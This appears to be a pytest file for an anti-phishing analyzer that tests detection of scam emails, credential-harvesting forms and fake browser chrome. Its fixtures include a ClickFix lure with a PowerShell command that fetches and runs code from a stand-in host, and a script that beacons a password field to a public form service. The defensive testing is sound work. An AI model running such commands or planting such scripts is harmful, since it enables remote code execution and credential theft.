import json
from email.message import EmailMessage

import pytest

from antiphish.analyzer import Analyzer,_network_candidate_priority
from antiphish.models import Verdict,UrlFinding


@pytest.mark.parametrize('text,code',[
 ('Для подтверждения заявки пришлите пароль ответным письмом.','SECRET_REPLY_REQUEST'),
 ('Продиктуйте код из СМС сотруднику поддержки.','SECRET_REPLY_REQUEST'),
 ('Send your password to our support agent.','SECRET_REPLY_REQUEST'),
 ('Для защиты средств переведите деньги на безопасный счёт.','SAFE_ACCOUNT_TRANSFER'),
 ('Для получения выплаты 150000 рублей оплатите комиссию 150 рублей.','UPFRONT_PAYOUT_FEE'),
 ('Оплатите verification fee to release your winnings.','UPFRONT_PAYOUT_FEE'),
 ('Для защиты банковского приложения установите AnyDesk. Сообщите код подключения оператору.','REMOTE_BANK_CONTROL'),
 ('Проверка браузера CAPTCHA. Нажмите Win + R и вставьте команду powershell -c "iex https://bad.example/run"','CLICKFIX_EXECUTION'),
])
def test_attack_behaviour_without_catalogued_brand(empty_kb,text,code):
    mail=EmailMessage();mail.set_content(text)
    report=Analyzer(empty_kb).analyze(mail.as_bytes(),name='mail.eml',profile='fast')
    assert report.verdict==Verdict.SUSPICIOUS
    reasons=[r for r in report.reason_codes if r.code==code]
    assert len(reasons)==1 and reasons[0].context.get('matched_text')
    assert report.configuration['decision']['reasons'][0]['code']==code


@pytest.mark.parametrize('text',[
 'Никогда не отправьте пароль по запросу незнакомца.',
 'Никогда не сообщите код из СМС сотруднику банка.',
 "Don't send your password to other people.",
 'Ваш код входа: 564123. Не сообщайте его никому.',
 'Переведите деньги на свой накопительный счёт в приложении банка.',
 'Для получения посылки оплатите доставку 150 рублей.',
 'Счёт за обслуживание: комиссия составляет 150 рублей.',
 'Для удалённой поддержки рабочего компьютера установите AnyDesk.',
 'Памятка: мошенники просят: «Сообщите пароль ответным письмом». Никогда этого не делайте.',
 'Как распознать фишинг: CAPTCHA просит Win + R и powershell -enc abcdef. Не запускайте это.',
 'Для установки Python откройте PowerShell. Команда pip install example.',
 'Please send password reset instructions to my email.',
 'Send your password reset link to your own mailbox.',
])
def test_normal_instructions_and_security_advice_are_not_behaviour_alerts(empty_kb,text):
    mail=EmailMessage();mail.set_content(text)
    r=Analyzer(empty_kb).analyze(mail.as_bytes(),name='mail.eml',profile='fast')
    assert r.verdict==Verdict.NOT_DETECTED,[e.code for e in r.reason_codes]


def test_plain_and_html_are_not_duplicated_for_classifiers(empty_kb,monkeypatch):
    received=[]
    monkeypatch.setattr('antiphish.layamodel.configured_score',lambda t:(received.append(t) or ([],[])))
    mail=EmailMessage();mail['Subject']='Статус';mail.set_content('Проверка уровня сервиса. Новая информация доступна в профиле.')
    mail.add_alternative('<h1>Проверка уровня сервиса.</h1><p>Новая информация доступна в профиле.</p>',subtype='html')
    r=Analyzer(empty_kb).analyze(mail.as_bytes(),name='mail.eml',profile='fast',options={'laya':True})
    assert received[0].count('Новая информация')==1


def test_google_sheet_literal_is_same_document_only():
    from antiphish.navigation import published_sheet_targets
    base='https://docs.google.com/spreadsheets/d/e/test/pubhtml'
    html=r'''<script>pageUrl: "https:\/\/docs.google.com\/spreadsheets\/d\/e\/test\/pubhtml\/sheet?headers\x3dfalse&gid=0"</script>'''
    assert published_sheet_targets(html,base)==[base+'/sheet?headers=false&gid=0']
    assert not published_sheet_targets(html,'https://other.example/')
    assert not published_sheet_targets(html.replace('test','different'),base)


def test_tracker_and_app_links_are_not_navigation_but_primary_cta_is():
    for host,path in [('www.googletagmanager.com','/ns.html?id=x'),('app.adjust.com','/123'),('support.google.com','/accounts/answer/32050')]:
        u=UrlFinding('https://'+host+path,normalized='https://'+host+path,host=host,source='html:iframe:src')
        assert _network_candidate_priority(u,False) is None and u.selection_reason
    a=UrlFinding('https://go.example/a',normalized='https://go.example/a',source='html:a:href',displayed_text='Получить выплату')
    b=UrlFinding('https://go.example/b',normalized='https://go.example/b',source='html:a:href',displayed_text='О компании')
    assert _network_candidate_priority(a,False)>_network_candidate_priority(b,False)
    a.displayed_text='Открыть условия участия'
    assert _network_candidate_priority(a,False) is not None


def test_avito_wrapper_is_decoded_without_switching_a_profile():
    from antiphish.urltools import unwrap_url
    assert unwrap_url('https://www.avito.ru/extended-profile/switch?id=42&then=https%3A%2F%2Fwww.avito.ru%2Fprofile')=='https://www.avito.ru/profile'
    assert unwrap_url('https://other.example/extended-profile/switch?then=https://target.example/') is None
    assert unwrap_url('https://www.avito.ru/mailStat/click?redirect=https%3A%2F%2Fwww.avito.ru%2Freputation&token=secret')=='https://www.avito.ru/reputation'
    service=UrlFinding('https://www.avito.ru/mailStat/click?redirect=https%3A%2F%2Fwww.avito.ru%2Flegal%2Fterms',host='www.avito.ru',source='link-wrapper')
    assert _network_candidate_priority(service,False) is None


def test_service_links_are_not_identity_evidence():
    from antiphish.urltools import auxiliary_link
    item=UrlFinding('https://app.adjust.com/123',host='app.adjust.com',source='text')
    assert auxiliary_link(item)
    item=UrlFinding('https://foreign.example/claim',host='foreign.example',source='html:a:href',displayed_text='Получить приз')
    assert not auxiliary_link(item)


def test_quoted_source_has_real_offsets_not_generated_facts():
    from antiphish.modelinput import ground_quotes
    text='Просим ввести\nпароль для входа.'
    refs=ground_quotes(['ввести пароль','несуществующая цитата'],[{'id':'source','label':'Письмо','text':text}])
    assert len(refs)==1 and text[refs[0]['start']:refs[0]['end']]==refs[0]['text']
    assert refs[0]['source_id']=='source'


def test_wrapper_route_precedes_its_already_decoded_target(empty_kb):
    from antiphish.network import FetchResult
    calls=[]
    body='<a href="https://www.avito.ru/mailStat/click?redirect=https%3A%2F%2Fdestination.example%2Fprofile&amp;token=x">Проверить уровень</a>'
    def fetch(url,limits):
        calls.append(url)
        return FetchResult(b'<p>Page</p>',url,[url],'text/html','200')
    r=Analyzer(empty_kb).analyze(body.encode(),name='mail.html',profile='fast',network='http',fetcher=fetch)
    assert calls==['https://destination.example/profile']
    assert [x['kind'] for x in r.routes]==['decoded-wrapper','navigation']
    assert r.routes[-1]['role']=='action'


def test_qwen_sources_include_headers_without_duplicate_mime(empty_kb):
    from antiphish.modelinput import sources
    from antiphish.extractors import extract_eml
    from antiphish.config import Limits
    from types import SimpleNamespace
    mail=EmailMessage();mail['From']='Sender <sender@example.org>';mail['Subject']='Status';mail.set_content('Body text')
    source=sources(extract_eml(mail.as_bytes(),Limits(),quality=False),SimpleNamespace(pages=[],model_evidence=[]))
    assert source[0]['id']=='message-headers' and 'sender@example.org' in source[0]['text']
    assert source[1]['id']=='message' and source[1]['text']=='Body text'


def test_password_form_posts_to_generic_form_service(empty_kb):
    body='<label for=p>Введите пароль</label><form action="https://formspree.io/f/example" method=post><input id=p name=entry></form>'
    r=Analyzer(empty_kb).analyze(body.encode(),name='page.html',base_url='https://portal.example/',profile='fast')
    assert r.verdict==Verdict.SUSPICIOUS
    assert 'SECRET_TO_PUBLIC_FORM' in {e.code for e in r.reason_codes}
    clean=body.replace('Введите пароль','Ваше имя')
    assert Analyzer(empty_kb).analyze(clean.encode(),name='page.html',base_url='https://portal.example/',profile='fast').verdict==Verdict.NOT_DETECTED


def test_aria_label_and_script_selector_without_field_id(empty_kb):
    body='''<input type=password aria-label="Пароль"><script>navigator.sendBeacon('https://formspree.io/f/x',document.querySelector('input[type=password]').value)</script>'''
    r=Analyzer(empty_kb).analyze(body.encode(),name='page.html',base_url='https://portal.example/',profile='fast')
    assert any(f.collector_observed and f.destination_host=='formspree.io' for p in r.pages for f in p.forms)
    assert 'SECRET_TO_PUBLIC_FORM' in {e.code for e in r.reason_codes}


def test_fake_browser_chrome_has_a_real_collector(empty_kb):
    body='<div class=address-bar>https://account.company.example/login</div><form method=post action=/auth><input type=password></form>'
    r=Analyzer(empty_kb).analyze(body.encode(),name='page.html',base_url='https://foreign.example/',profile='fast')
    assert 'FAKE_BROWSER_ADDRESS' in {e.code for e in r.reason_codes} and r.verdict==Verdict.SUSPICIOUS
    same=Analyzer(empty_kb).analyze(body.encode(),name='page.html',base_url='https://account.company.example/',profile='fast')
    assert same.verdict==Verdict.NOT_DETECTED
